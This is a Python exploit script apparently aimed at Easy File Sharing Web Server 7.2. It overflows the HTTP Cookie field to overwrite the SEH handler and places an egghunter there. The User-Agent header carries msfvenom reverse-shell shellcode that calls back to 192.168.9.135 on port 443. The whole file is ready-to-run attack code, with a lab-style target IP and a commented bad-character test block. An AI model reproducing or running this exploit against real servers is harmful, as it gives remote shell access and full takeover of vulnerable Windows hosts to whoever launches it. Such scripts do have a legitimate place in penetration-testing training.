# Easy File share 7.2
import socket, sys, struct
rhost = "192.168.9.147"
rport = 80
max_size = 5000
seh_off = 4059
eax_off = 4183
buffer = "A"* 4059
nseh = "\x90\x90\xeb\x0a" # short jump over seh by 8 bytes 
seh = "\xf2\x95\x01\x10" #pop pop ret 0x100195F2
pad = "A" * (eax_off - len(buffer))
pad += "DDDD"

#buffer += "A" * (max_size - len(buffer))
'''#bad char checks
buffer += ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
'''
egg = "w00t"*2
hunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
hunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.9.135 LPORT=443 -b "\x00\x3b" -f python
buf =  ""
buf += "\xbf\x9d\x79\xd4\xda\xd9\xc4\xd9\x74\x24\xf4\x5b\x33"
buf += "\xc9\xb1\x52\x31\x7b\x12\x83\xc3\x04\x03\xe6\x77\x36"
buf += "\x2f\xe4\x60\x34\xd0\x14\x71\x59\x58\xf1\x40\x59\x3e"
buf += "\x72\xf2\x69\x34\xd6\xff\x02\x18\xc2\x74\x66\xb5\xe5"
buf += "\x3d\xcd\xe3\xc8\xbe\x7e\xd7\x4b\x3d\x7d\x04\xab\x7c"
buf += "\x4e\x59\xaa\xb9\xb3\x90\xfe\x12\xbf\x07\xee\x17\xf5"
buf += "\x9b\x85\x64\x1b\x9c\x7a\x3c\x1a\x8d\x2d\x36\x45\x0d"
buf += "\xcc\x9b\xfd\x04\xd6\xf8\x38\xde\x6d\xca\xb7\xe1\xa7"
buf += "\x02\x37\x4d\x86\xaa\xca\x8f\xcf\x0d\x35\xfa\x39\x6e"
buf += "\xc8\xfd\xfe\x0c\x16\x8b\xe4\xb7\xdd\x2b\xc0\x46\x31"
buf += "\xad\x83\x45\xfe\xb9\xcb\x49\x01\x6d\x60\x75\x8a\x90"
buf += "\xa6\xff\xc8\xb6\x62\x5b\x8a\xd7\x33\x01\x7d\xe7\x23"
buf += "\xea\x22\x4d\x28\x07\x36\xfc\x73\x40\xfb\xcd\x8b\x90"
buf += "\x93\x46\xf8\xa2\x3c\xfd\x96\x8e\xb5\xdb\x61\xf0\xef"
buf += "\x9c\xfd\x0f\x10\xdd\xd4\xcb\x44\x8d\x4e\xfd\xe4\x46"
buf += "\x8e\x02\x31\xc8\xde\xac\xea\xa9\x8e\x0c\x5b\x42\xc4"
buf += "\x82\x84\x72\xe7\x48\xad\x19\x12\x1b\x12\x75\x15\x5c"
buf += "\xfa\x84\x25\x63\x40\x01\xc3\x09\xa6\x44\x5c\xa6\x5f"
buf += "\xcd\x16\x57\x9f\xdb\x53\x57\x2b\xe8\xa4\x16\xdc\x85"
buf += "\xb6\xcf\x2c\xd0\xe4\x46\x32\xce\x80\x05\xa1\x95\x50"
buf += "\x43\xda\x01\x07\x04\x2c\x58\xcd\xb8\x17\xf2\xf3\x40"
buf += "\xc1\x3d\xb7\x9e\x32\xc3\x36\x52\x0e\xe7\x28\xaa\x8f"
buf += "\xa3\x1c\x62\xc6\x7d\xca\xc4\xb0\xcf\xa4\x9e\x6f\x86"
buf += "\x20\x66\x5c\x19\x36\x67\x89\xef\xd6\xd6\x64\xb6\xe9"
buf += "\xd7\xe0\x3e\x92\x05\x91\xc1\x49\x8e\xa1\x8b\xd3\xa7"
buf += "\x29\x52\x86\xf5\x37\x65\x7d\x39\x4e\xe6\x77\xc2\xb5"
buf += "\xf6\xf2\xc7\xf2\xb0\xef\xb5\x6b\x55\x0f\x69\x8b\x7c"

httpreq = (
"GET / HTTP/1.1\r\n"
"User-Agent: w00tw00t"+ buf + "\r\n"
"Host:" + rhost + ":" + str(rport) + "\r\n"
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
"Accept-Language: en-us\r\n"
"Accept-Encoding: gzip, deflate\r\n"
"Referer: http://" + rhost + "/\r\n"
"Cookie: SESSIONID=6771; UserID=" + buffer + nseh + seh + "A"*8 +hunter + pad +"; PassWD=;\r\n"
"Conection: Keep-Alive\r\n\r\n"
)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[!] Sending payload"
s.connect((rhost,rport))
print "[!] Sent"
s.send(httpreq)
s.close
